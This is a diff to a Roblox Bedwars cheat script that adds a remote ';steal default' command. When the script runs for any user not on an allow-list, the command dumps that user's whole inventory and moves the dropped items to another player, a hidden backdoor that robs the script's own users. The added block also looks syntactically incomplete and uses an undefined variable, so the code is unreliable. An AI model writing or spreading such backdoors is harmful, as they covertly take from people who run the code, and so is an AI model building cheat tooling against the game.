@@ -10682,6 +10682,24 @@ local commands = {
 			bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
 		end
 	end,
+	[";steal default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
+				GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
+				task.wait(1)
+			end
+			for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
+				local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
+					item = v.tool,
+					amount = v.amount ~= math.huge and v.amount or 99999999
+				})
+				if e then 
+					e.CFrame = plr.Character.HumanoidRootPart.CFrame
+				else
+					v.tool:Destroy()
+			end
+		end
+	end,
 	[";byfron default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			task.spawn(function()
